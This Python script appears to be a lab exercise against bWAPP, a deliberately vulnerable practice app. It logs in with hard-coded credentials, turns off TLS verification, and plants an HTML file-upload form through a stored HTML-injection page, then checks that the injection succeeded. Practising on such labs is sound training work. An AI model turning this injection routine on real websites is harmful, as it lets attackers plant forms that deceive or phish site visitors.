import requests
from bs4 import BeautifulSoup

def login_page(url, login_data):
    with requests.Session() as session:
        r = session.post(url, data=login_data, verify=False)
    cookies = session.cookies.get_dict()
    if "Invalid credentials or user not activated!" in r.text:
        print("Login not successful")
        return False
    print("Login successful")
    
    return cookies

def inject_html(url, cookies):
    form = "<form action='/' method='POST' enctype='multipart/form-data'><input type='file' id='file' name='file'><input type='submit' name='submit' value='Upload File'></form>"

    payload = {"entry":form,"blog":"submit","entry_add":""}

    r = requests.post(url, data=payload, cookies=cookies, verify=False)

    soup = BeautifulSoup(r.text, "html.parser")
    for form in soup.find_all("form"):
        if soup.find("form", {"action":"/"} ) is not None:
            print("Found payload :", soup.find("form", {"action":"/"} ))
            print("HTML injection successful")
            return True

    print("HTML injection not successful")
    return False


login_url = "https://bwapp.hakhub.net/login.php"
login_data = {"login":"benoit","password":"bug", "security_level":0,"form":"submit"}
login = login_page(login_url, login_data)

url = "https://bwapp.hakhub.net/htmli_stored.php"

inject_html(url, login)